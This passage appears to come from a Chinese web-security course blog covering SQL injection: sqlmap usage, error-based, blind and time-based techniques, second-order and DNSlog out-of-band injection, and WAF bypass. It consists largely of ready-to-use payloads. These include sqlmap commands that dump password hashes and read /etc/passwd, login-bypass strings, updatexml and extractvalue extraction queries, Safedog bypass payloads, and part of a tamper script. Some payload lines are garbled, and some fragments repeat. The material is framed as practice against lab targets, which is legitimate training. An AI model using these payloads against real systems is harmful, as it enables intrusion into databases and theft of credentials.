class="number">16.</span>/sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</span></span><br><span class="line">--auth-type Basic --auth-cred <span class="string">&quot;testuser:testpass&quot;</span></span><br><span class="line"><span class="number">17.</span>/sqlmap.py -l burp.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line"><span class="number">18.</span>/sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</span> --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v <span class="number">3</span> </span><br><span class="line"><span class="number">19.</span>/sqlmap.py -u <span class="string">&quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</span> --sql-query <span class="string">&quot;SELECT &#x27;foo&#x27;&quot;</span> -v <span class="number">1</span> </span><br><span class="line"><span class="number">20.</span>/sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --common-tables -D testdb --banner </span><br><span class="line"><span class="number">21.</span>/sqlmap.py -u <span class="string">&quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot;</span> --string=<span class="string">&#x27;xx&#x27;</span> --dbs --level=<span class="number">3</span> -p <span class="string">&quot;uid&quot;</span></span><br><span class="line">/test.txt --file-d</span><br><span class="line"><span class="number">17.</span>/sqlmap.py -l burp.log --scope=<span class="string">&quot;(www)?\.target\.(com|net|org)&quot;</span></span><br><span class="line"><span class="number">18.</span>/sqlmap.py -u <span class="string">&quot;http://192.1</span></span><br></pre></td></tr></table></figure>

<p>简单的注入流程 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第16天：WEB漏洞—SQL注入之查询方式及报错盲注</p>
<p>前言：当进行SQL注入时，有很多注入会出现无回显的情况，其中不回显的原因可能是SQL语句查询方式的问题导致，这个时候我们需要用到相关的报错或盲注进行后续操作，同时作为手工注入时，提前了解或预知其SQL语句大概写法也能更好的选择对应的注入语句；</p>
<h2 id="第十六天：WEB漏洞—SQL注入之查询方式及报错盲注"><a href="#第十六天：WEB漏洞—SQL注入之查询方式及报错盲注" class="headerlink" title="第十六天：WEB漏洞—SQL注入之查询方式及报错盲注"></a>第十六天：WEB漏洞—SQL注入之查询方式及报错盲注</h2><p>&#x3D;&#x3D;便宜注入&#x3D;&#x3D;</p>
<p>查询方式</p>
<p>1）select 查询数据</p>
<p>在网站应用中进行数据显示查询操作<br>        例：select * from news where id&#x3D;$id</p>
<p>2）insert 插入数据</p>
<p>在网站应用中进行用户注册添加等操作<br>        例：insert into news(id,url,text) values(2,‘x’,‘$t’)</p>
<p>3）delete 删除数据</p>
<p>后台管理里面删除文章删除用户等操作<br>        例：delete from news where id&#x3D;$id</p>
<p>4）update 更新数据</p>
<p>会员或后台中心数据同步或缓存等操作<br>        例：update user set pwd&#x3D;‘$p’ where id&#x3D;2 and username&#x3D;‘admin’</p>
<p>5）order by 排序数据</p>
<p>一般结合表名或列名进行数据排序操作<br>        例：select * from news order by $id<br>        例：select id,name,price from news order by $order</p>
<p>重点理解：<br>        我们可以通过以上查询方式与网站应用的关系<br>        注入点产生地方或应用猜测到对方的 SQL 查询方式</p>
<p>SQL 注入报错盲注</p>
<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断<br>或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
<p>1）基于布尔的 SQL 盲注-逻辑判断</p>
<p>regexp,like,ascii,left,ord,mid</p>
<p>2）基于时间的 SQL 盲注-延时判断</p>
<p>if,sleep</p>
<p>3）基于报错的 SQL 盲注-报错回显</p>
<p>floor，updatexml，extractvalue</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">1、通过floor报错,注入语句如下:</span><br><span class="line">and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line">2、通过ExtractValue报错,注入语句如下:</span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line"></span><br><span class="line">3、通过UpdateXml报错,注入语句如下:</span><br><span class="line">and 1=(updatexml(1,concat(0x3a,(select user())),1))</span><br><span class="line"></span><br><span class="line">4、通过NAME_CONST报错,注入语句如下:</span><br><span class="line">and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br><span class="line"></span><br><span class="line">5、通过join报错,注入语句如下:</span><br><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br><span class="line"></span><br><span class="line">6、通过exp报错,注入语句如下:</span><br><span class="line">and exp(~(select * from (select user () ) a) );</span><br><span class="line"></span><br><span class="line">7、通过GeometryCollection()报错,注入语句如下:</span><br><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br><span class="line"></span><br><span class="line">8、通过polygon ()报错,注入语句如下:</span><br><span class="line">and polygon (()select * from(select user ())a)b );</span><br><span class="line"></span><br><span class="line">9、通过multipoint ()报错,注入语句如下:</span><br><span class="line">and multipoint (()select * from(select user() )a)b );</span><br><span class="line"></span><br><span class="line">10、通过multlinestring ()报错,注入语句如下:</span><br><span class="line">and multlinestring (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line">11、通过multpolygon ()报错,注入语句如下:</span><br><span class="line">and multpolygon (()select * from(selectuser () )a)b );</span><br><span class="line"></span><br><span class="line">12、通过linestring ()报错,注入语句如下:</span><br><span class="line">and linestring (()select * from(select user() )a)b );</span><br><span class="line"></span><br><span class="line">常用的万能username语句：</span><br><span class="line">a ’ or 1=1 #</span><br><span class="line">a &quot;) or 1=1 #</span><br><span class="line">a‘) or 1=1 #</span><br><span class="line">a” or “1”=”1</span><br><span class="line">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; or (length(database())) = 8 (用于输入’ “都没有错误)</span><br><span class="line">&#x27; or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)</span><br><span class="line">&quot;) or (&quot;1&quot;)=(&quot;1</span><br><span class="line">&quot;) or 1=1 or if(1=1, sleep(1), null) #</span><br><span class="line">&quot;) or (length(database())) = 8 #</span><br><span class="line">&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #</span><br><span class="line"></span><br><span class="line">post型盲注通杀payload：uname=admin%df&#x27;or()or%200%23&amp;passwd=&amp;submit=Submit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关于UPDATEXML,REFERER,COOKIE的构造</span><br><span class="line">User-Agent:.........&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #</span><br><span class="line">Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br><span class="line"></span><br><span class="line">updatexml报错注入</span><br><span class="line">爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br><span class="line">链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)</span><br><span class="line">链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</span><br><span class="line">爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)</span><br><span class="line">爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>



<h3 id="演示案例-2"><a href="#演示案例-2" class="headerlink" title="演示案例"></a>演示案例</h3><pre><code>1.各种查询方式注入测试（报错盲注)

insert
</code></pre>
<p>打开靶场pikachu抓包注入</p>
<p><img src="https://img-blog.csdnimg.cn/ecdfd30b259043c5a72417cd4a4daed1.png" alt="在这里插入图片描述"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">1.username=x’ or(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tableslimit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or ’ &amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</span><br><span class="line"></span><br><span class="line">2.username=x’ or updatexml(1,concat(0x7e,(version())),0) or</span><br><span class="line">&#x27;&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</span><br><span class="line"></span><br><span class="line">3.username=x’ or extractvalue(1,concat(0x7e,database())) or</span><br><span class="line">&#x27;&amp;password=xiaodi&amp;sex=%E7%94%B7&amp;phonenum=13878787788&amp;email=wuhan&amp;add=hubei&amp;submit=submit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">update</span><br><span class="line">payload update：</span><br><span class="line"></span><br><span class="line">1.sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky’ or (select 1 from(select</span><br><span class="line">count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets</span><br><span class="line">group by x)a) or &#x27;&amp;email=wuhan&amp;submit=submit</span><br><span class="line"></span><br><span class="line">2.sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=hubeNicky’ or</span><br><span class="line">updatexml(1,concat(0x7e,(version())),0) or ‘&amp;email=wuhan&amp;submit=submit</span><br><span class="line">sex=%E7%94%B7&amp;phonenum=13878787788&amp;add=Nicky’ or extractvalue(1,concat(0x7e,database())) or ’ &amp;email=wuhan&amp;submit=submit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete</span><br><span class="line">payload delete：</span><br><span class="line"></span><br><span class="line">1./pikachu/vul/sqli/sqli_del.php?id=56+or+(select+1+from(select+count(*),concat(floor(rand(0)*2),0x7e,(database()),0x7e)x+from+information_schema.character_sets+group+by+x)a)</span><br><span class="line"></span><br><span class="line">2.pikachu/vul/sqli/sqli_del.php?id=56+or+updatexml+(1,concat(0x7e,database()),0)</span><br><span class="line"></span><br><span class="line">3./pikachu/vul/sqli/sqli_del.php?id=56+or+extractvalue(1,concat(0x7e,database()))</span><br></pre></td></tr></table></figure>

<p>在这里插入图片描述</p>
<pre><code>2.sqlilabs-less2 注入测试（延时盲注）
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">延时注入</span><br><span class="line"></span><br><span class="line">一般都是工具去注入；</span><br><span class="line">采用一些语句去猜数据库长度，内容等；</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">延时盲注：</span><br><span class="line">1.and if(ascii(substr(database(),1,1))=115,sleep(5),1)- -+</span><br><span class="line"></span><br><span class="line">在这里插入图片描述</span><br><span class="line"></span><br><span class="line">2.and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(3),0)- -+</span><br><span class="line"></span><br><span class="line">用ASCII码可以防止引号转义；</span><br></pre></td></tr></table></figure>



<pre><code>3.sqlilabs-less5 注入测试（布尔盲注）
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="第17天：WEB漏洞—SQL注入之二次-加解密-DNS等注入"><a href="#第17天：WEB漏洞—SQL注入之二次-加解密-DNS等注入" class="headerlink" title="第17天：WEB漏洞—SQL注入之二次,加解密,DNS等注入"></a>第17天：WEB漏洞—SQL注入之二次,加解密,DNS等注入</h2><p>WEB漏洞—SQL注入之二次,加解密,DNS等注入</p>
<p>加解密，二次，DNSlog 注入</p>
<p>1）加解密注入<br>提交方法(post、get等）传递的参数被加密了，然后传递给服务器，加密方式有base64等；</p>
<p>网站上的参数如果加密了，注入的语句也要进行加密，才能实现注入，否则会注入失败；</p>
<p>2）二次注入<br>二次注入无法通过扫描工具实现的，需要代码审计的时候才能发现，不好触发<br>无法在黑盒测试中使用；注册一个包含恶意代码的用户，然后网站调用用户名的时候恶意代码就会执行；</p>
<p>在这里插入图片描述</p>
<p>3） DNSlog注入<br>DNSlog注入需要&#x3D;&#x3D;注入点是高权限&#x3D;&#x3D;；<br>首先自己需要创建一个可以配置的域名，我们这里用的是ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了。DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息。简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息；</p>
<p>也可以采用工具dnslogSqlinj，下载地址：<a target="_blank" rel="noopener" href="https://github.com/ADOOO/DnslogSqlinj">https://github.com/ADOOO/DnslogSqlinj</a></p>
<p><img src="https://img-blog.csdnimg.cn/94083c6fbe6a43cebce069c65d147a34.png" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/05ec393922ae44bda0f56df02b230b99.png" alt="在这里插入图片描述"></p>
<p>DNSlog:解决了盲注不能回显数据，效率低的问题；<br>演示案例</p>
<pre><code>1.sqlilabs-less21-cookie&amp;加解密注入（实际案例）
</code></pre>
<p>打开靶场</p>
<p>登录账号密码，然后抓包，就可以看到cookie被加密，所以注入点在cookie这里；</p>
<p>使用报错注入，报错注入也采取base64加密，才能注入，得到数据库的版本，注入成功；</p>
<pre><code>2.sqlilabs-less24-post 登陆框&amp;二次注入（实际案例）
</code></pre>
<p>打开靶场，创建一个新用户，名字和已有用户不同，在后面加上‘#</p>
<p>修改新建用户密码，但是#把密码条件注释了，所以修改的就是本来用户的密码；</p>
<p>因为 #’ 闭合了引号，所以修改密码成功；</p>
<p>实战情况下有长度限制，分为前端限制和后端限制；<br>前端限制是写在html里面的，会有长度限制，但是可以修改的；<br>后端限制是在php里面的，无法突破；</p>
<p>二次注入需要配合代码，实战情况下很多东西都是未知的，不知道什么时候能触发二次注入；</p>
<pre><code>3.sqlilabs-less9-load_file&amp;dnslog 带外注入（实际案例）
</code></pre>
<p>注册账号，然后执行sql语句</p>
<p><img src="https://img-blog.csdnimg.cn/043628e62d6d4fc29eff0ac58336fdd2.png#pic_center" alt="在这里插入图片描述"></p>
<p>平台接收，从中获取信息；</p>
<p><img src="https://img-blog.csdnimg.cn/b25e92d5899f469194c31dc20c1adb50.png" alt="在这里插入图片描述"></p>
<pre><code>4.py-DnslogSqlinj-dnslog 注入演示脚本演示（实际案例）
</code></pre>
<p>下载工具，并且启用</p>
<p>在这里插入图片描述</p>
<p>使用语句注入查询信息</p>
<p>在这里插入图片描述</p>
<h2 id="第18天：WEB漏洞—SQL注入之堆叠及WAF绕过注入"><a href="#第18天：WEB漏洞—SQL注入之堆叠及WAF绕过注入" class="headerlink" title="第18天：WEB漏洞—SQL注入之堆叠及WAF绕过注入"></a>第18天：WEB漏洞—SQL注入之堆叠及WAF绕过注入</h2><p>堆叠查询注入<br>Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from uesr; select id where date&gt;2;    </span><br></pre></td></tr></table></figure>

<p>堆叠注入是多条语句注入，堆叠注入不是每个数据库都支持的，堆叠注入是有局限性的；</p>
<p>phpstudy+safedog 安装找不到服务解决<br>参考链接：<a target="_blank" rel="noopener" href="https://www.freesion.com/article/15621202542/">https://www.freesion.com/article/15621202542/</a></p>
<p>市面上常见的 waf 产品列表分析-wafw00</p>
<p>WAF及绕过思路</p>
<p><img src="https://img-blog.csdnimg.cn/2be0ac41b62e4494be77ccb6db1652a2.png" alt="在这里插入图片描述"></p>
<p> 下载一个安全狗</p>
<ol>
<li>漏洞检测会检测请求方式，可以更换请求方式( get  —&gt;post )，然后实现注入 ，前提条件是数据支持替换提交方式；</li>
<li>会阻止查询数据库相关信息，不能直接写关键字，例如database（）等；</li>
</ol>
<p>WAF绕过-应用层<br>1.可以加一些符号，绕过匹配规则；<br>每个数据库特殊符号都不一样；拦截的是一个整体，实现拆封就可以绕过；</p>
<p><img src="https://img-blog.csdnimg.cn/6e71c34e0e9e483eb1d568b17f9db299.png" alt="在这里插入图片描述"></p>
<p>2.大小写&#x2F;关键字替换；</p>
<p>id&#x3D;1 UnIoN&#x2F;**&#x2F;SeLeCT 1,user()</p>
<p>Hex() bin() 等价于 ascii()<br>        Sleep() 等价于 benchmark()<br>        Mid()substring() 等价于 substr()<br>        @@user 等价于 User()<br>        @@Version 等价于 version()</p>
<p>3.各种编码<br>大小写，URL，hex，%0A 等</p>
<p>4.注释使用<br>&#x2F;&#x2F; – –+ # &#x2F;&#x2F; + :%00 &#x2F;!&#x2F;等</p>
<p><img src="https://img-blog.csdnimg.cn/c38ae007b5a64396b627d9931497da45.png" alt="在这里插入图片描述"></p>
<p>a写在这里因为安全狗没有拦截union a select</p>
<p>5.再次循环<br>union&#x3D;&#x3D;uunionnion</p>
<p>6.等价替换<br>user()&#x3D;@@user() and&#x3D;&amp; or&#x3D;| ascii&#x3D;hex 等</p>
<p>7.参数污染<br>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p>
<p>HTTP参数污染<br><img src="https://img-blog.csdnimg.cn/d987f1396bfa47c4be7ef67abb111037.png#pic_center" alt="在这里插入图片描述">&#96;**</p>
<p><img src="https://img-blog.csdnimg.cn/5b0f4dfb42384d24bddc9ddba372212d.png" alt="在这里插入图片描述"></p>
<p>8.编码解码及加密解密<br> s-&gt;%73-&gt;%25%37%33<br>hex,unlcode,base64 等</p>
<p>9.更改请求提交方式<br>GET POST COOKIE 等<br>POST-&gt;multipart&#x2F;form-data</p>
<p>模糊测试（fuzz）<br>fuzz不是技术是思路。通过编写脚本进行批量测试。</p>
<h3 id="演示案例-3"><a href="#演示案例-3" class="headerlink" title="演示案例"></a>演示案例</h3><pre><code>1.Sqlilabs-Less38-堆叠注入(多语句)
</code></pre>
<p>构造payload： <a target="_blank" rel="noopener" href="http://192.168.74.144/sqli-labs-master/Less-38/?id=1%E2%80%99;insert">http://192.168.74.144/sqli-labs-master/Less-38/?id=1’;insert</a> into users(id,username,password) values (‘38’,‘less38’,‘hello’)–+</p>
<p><img src="https://img-blog.csdnimg.cn/2953e7568e6645aab9c9dc21d70a1720.png" alt="在这里插入图片描述"></p>
<p>例：注入需要管理员账号密码，密码是加密的，无法解密；<br>堆叠注入进行插入数据，用户密码自定义的，可以正常解决登录；</p>
<pre><code>2.WAF部署-安全狗,宝塔等waf搭建部署



3.简要讲解安全狗,宝塔等防护waf策略规则
</code></pre>
<p>是通过网站防护、资源防护等手段来保护网站的。    安全狗:会对关键字进行匹配，来保护网站</p>
<p><img src="https://img-blog.csdnimg.cn/ab72d353b4704eda9868c3ef59b45e77.png" alt="在这里插入图片描述"></p>
<pre><code>4.简要演示安全狗 bypass sqlinject 防护规则
</code></pre>
<p>部分 bypass sqlinject payload<br>id&#x3D;1 union&#x2F;%00&#x2F;%23a%0A&#x2F;!&#x2F;!select 1,2,3*&#x2F;;%23<br>id&#x3D;-1 union&#x2F;%00&#x2F;%23a%0A&#x2F;!&#x2F;!select%201,database%23x%0A(),3*&#x2F;;%23<br>id&#x3D;-1%20union%20&#x2F;!44509select&#x2F;%201,2,3%23<br>id&#x3D;-1%20union%20&#x2F;!44509select&#x2F;%201,%23x%0A&#x2F;!database&#x2F;(),3%23<br>id&#x3D;1&#x2F;&amp;id&#x3D;-1%20union%20select%201,2,3%23*&#x2F;<br>id&#x3D;-1 %20union%20all%23%0a%20select%201,2,3%23<br>-1 %20union%20all%23%0a%20select%201,%230%0Adatabase&#x2F;&#x2F;(),3%23</p>
<p>涉及资源<br>1.<a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a>             堆叠注入详解<br>2.<a target="_blank" rel="noopener" href="https://blog.csdn.net/nzjdsds/article/details/93740686">https://blog.csdn.net/nzjdsds/article/details/93740686</a>         安全狗安装的问题</p>
<h2 id="第19天：WEB漏洞—SQL注入之SQLMAP绕过WAF"><a href="#第19天：WEB漏洞—SQL注入之SQLMAP绕过WAF" class="headerlink" title="第19天：WEB漏洞—SQL注入之SQLMAP绕过WAF"></a>第19天：WEB漏洞—SQL注入之SQLMAP绕过WAF</h2><p>前言：在攻防实战中，往往需要掌握一些特性，比如服务器、数据库、应用层、WAF 层等，以便我们更灵活地去构造 Payload，从而可以和各种WAF 进行对抗，甚至绕过安全防御措施进行漏洞利用。</p>
<p>在这里插入图片描述</p>
<p>衔接18天课程<br>1.数据库特性<br>1、Mysql 技巧<br>（1）mysql 注释符有三种：#、&#x2F;…&#x2F;、– … (注意–后面有一个空格)<br>（2）空格符:[0x09,0x0a-0x0d,0x20,0xa0]<br>（3）特殊符号：%a 换行符<br>可结合注释符使用%23%0a，%2d%2d%0a。<br>（3）内联注释：<br>&#x2F;!UnIon12345SelEcT&#x2F; 1,user() &#x2F;&#x2F;数字范围 1000-50540</p>
<p>2.FUZZ绕过脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/envpython</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)</span></span><br><span class="line"><span class="string">Seethefile&#x27;LICENSE&#x27;forcopyingpermission</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common import singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums import DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__=PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">dependencies</span>():</span><br><span class="line">	<span class="title function_ invoke__">singleTimeWarnMessage</span>(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span>%(os.path.<span class="title function_ invoke__">basename</span>(__file__).<span class="title function_ invoke__">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>],DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">tamper</span>(payload,**kwargs):</span><br><span class="line">    </span><br><span class="line"><span class="comment">#%23a%0aunion/*!44575select*/1,2,3</span></span><br><span class="line">	<span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;union&quot;</span>,<span class="string">&quot;%23a%0aunion&quot;</span>)</span><br><span class="line">        payload=payload.<span class="title function_ invoke__">replace</span>(<span class="string">&quot;select&quot;</span>,<span 